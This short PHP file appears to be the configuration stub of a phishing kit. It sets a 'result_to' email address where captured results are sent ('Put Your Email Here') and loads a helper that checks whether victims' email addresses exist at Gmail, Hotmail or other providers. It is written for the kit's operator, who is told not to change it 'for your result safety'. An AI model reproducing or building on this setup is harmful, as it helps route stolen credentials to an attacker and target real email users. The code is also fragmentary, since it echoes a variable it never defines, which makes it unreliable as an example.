<?php


$result_to = "dz-dz789@hçtmail.com";//Put Your Email Here

 #Function isWrong this function is a shortcut script by phpQuery That Where we can try if an email exist in Gmail or Hotmail or any Company's Database
 #So don't touch any thing in this area for your result safety

 require_once("iswrong.php");
 
 echo $ip_addresse;

?>
